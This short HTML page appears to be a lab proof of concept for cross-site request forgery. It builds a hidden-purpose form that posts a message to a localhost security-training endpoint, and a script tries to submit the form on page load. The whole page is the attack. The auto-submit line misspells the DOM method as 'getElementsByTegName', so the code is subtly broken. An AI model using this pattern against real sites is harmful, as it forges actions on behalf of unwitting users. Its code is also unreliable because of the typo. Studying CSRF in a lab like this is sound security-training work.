<form action="http://localhost/security.permaviat.ru/ajax/message.php" method="POST">
    <br>Номер поста:
    <br><input name="IdPost" type="number" value="1"/>
    <br>Сообщение:
    <br><input name="Message" type="text" value="CSRF инъекция"/>
    <br><input type="submit"/>
</form>

<script>
    document.getElementsByTegName("form")[0].submit();
</script>